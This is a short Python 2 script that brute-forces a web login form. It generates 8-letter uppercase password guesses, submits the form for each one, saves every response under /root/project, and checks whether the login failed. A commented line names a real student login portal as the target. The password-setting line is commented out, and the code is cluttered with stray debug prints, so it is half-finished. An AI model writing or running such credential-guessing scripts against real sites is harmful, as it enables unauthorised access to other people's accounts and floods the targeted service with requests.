#!/usr/bin/env python
import mechanize
import sys
from itertools import combinations
from string import ascii_uppercase
#url = "https://www.cdac.in/index.aspx?id=studentslogin"
def broken():
	url=raw_input('Enter the URL : ' )
#input("Enter the address")
	browser = mechanize.Browser()
	attackNumber = 1
	passwords = (p for p in combinations(ascii_uppercase,8))
	for p in passwords:
		print ''.join(p)
		browser.open(url)
		browser.select_form(nr=0)
	#browser["login"] = 'testuser'
		for form in browser.forms():
			print "Hello",form.name
			print form
		print"ok1234"
		#browser["passwd"] = ''.join(p)
		res = browser.submit()
		content = res.read()
		print"bye"
		print res.code
		#output = open('response/'+str(attackNumber)+'.txt','w')
		output=open('/root/project'+str(attackNumber)+ 'brokenpayload.txt','w')
		output.write(content)
		print"happy-sad"
		output.close()
		print"smile"
		attackNumber +=1
		print"goto hell"
		if content.find('<input type = "password" name="passwd"/>') > 0:
			print "Login failed"
def main():
	broken()
if __name__=='__main__':
	main()
